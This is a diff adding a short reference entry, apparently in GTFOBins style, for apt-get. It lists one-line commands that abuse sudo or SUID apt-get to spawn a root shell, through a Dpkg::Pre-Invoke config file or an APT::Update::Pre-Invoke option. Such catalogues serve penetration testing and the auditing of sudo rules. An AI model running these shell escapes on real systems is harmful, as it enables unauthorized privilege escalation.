@@ -1,0 +1,32 @@
+apt-get
+=======
+
+Inherit
+-------
+
+[Sudo]
+    apt-get changelog apt
+
+[Unprivileged]
+    apt-get changelog apt
+
+Shell
+-----
+
+[Sudo]
+    echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' >/path/to/temp-file
+apt-get -y install -c /path/to/temp-file sl
+    For this to work the target package (i.e., `sl`) must not be already installed.
+
+[SUID]
+    echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' >/path/to/temp-file
+apt-get -y install -c /path/to/temp-file sl
+    For this to work the target package (i.e., `sl`) must not be already installed.
+
+[Sudo]
+    apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+    When the shell exits the `update` command is actually executed.
+
+[SUID]
+    apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+    When the shell exits the `update` command is actually executed.
